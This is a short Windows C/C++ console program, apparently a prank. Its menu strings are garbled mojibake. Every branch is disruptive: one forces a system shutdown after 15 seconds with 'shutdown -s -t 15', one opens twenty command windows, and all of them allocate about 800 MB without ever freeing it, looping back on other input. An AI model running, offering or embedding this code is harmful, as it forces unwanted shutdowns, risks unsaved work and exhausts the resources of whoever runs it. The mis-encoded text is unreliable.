# include <stdio.h>
# include <windows.h>
# include <malloc.h>
int main()
{
	int c, n = 10000000;
	int j;

	nihao:
		printf("1: ����\n");
		printf("2: ������ը\n");
		printf("��ѡ��:  ");

		scanf("%d",&c);

		if ( c == 1 )
		{
			system ("shutdown -s -t 15");
			double *p = new double [100000000];
		}
		else if ( 2 == c )
		{
			printf("��̫���ˣ���Ҫ�ͷ���!\n");
			double *p = new double [100000000];
			for ( j  =0 ; j < 20 ; ++j )
				system("start");
		}
		else
		{
			printf("���ô��ˣ�����������!\n");
			double *p = new double [100000000];
			goto nihao;
	}

	return 0;
}
